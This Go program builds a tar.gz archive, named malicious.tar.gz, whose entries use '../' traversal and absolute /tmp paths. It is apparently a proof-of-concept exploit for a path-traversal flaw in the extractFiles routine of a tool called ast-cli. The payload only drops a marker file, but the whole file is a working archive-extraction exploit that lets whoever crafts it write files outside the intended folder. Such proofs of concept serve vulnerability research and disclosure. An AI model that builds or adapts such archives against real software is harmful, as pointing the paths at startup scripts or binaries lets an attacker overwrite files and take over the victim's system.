package main

import (
	"archive/tar"
	"compress/gzip"
	"fmt"
	"os"
)

func main() {
	out, err := os.Create("malicious.tar.gz")
	if err != nil {
		panic(err)
	}
	defer out.Close()

	gz := gzip.NewWriter(out)
	defer gz.Close()
	tw := tar.NewWriter(gz)
	defer tw.Close()

	payload1 := []byte("PWN_VIA_PATH_TRAVERSAL_in_ast-cli_extractFiles\n")
	if err := tw.WriteHeader(&tar.Header{
		Name:     "../../../../../../../tmp/cx_pwn_traversal_test",
		Mode:     0644,
		Size:     int64(len(payload1)),
		Typeflag: tar.TypeReg,
	}); err != nil {
		panic(err)
	}
	if _, err := tw.Write(payload1); err != nil {
		panic(err)
	}

	if err := tw.WriteHeader(&tar.Header{
		Name:     "/tmp/cx_pwn_traversal_dir",
		Mode:     0755,
		Typeflag: tar.TypeDir,
	}); err != nil {
		panic(err)
	}

	fmt.Println("[+] malicious.tar.gz generated")
}
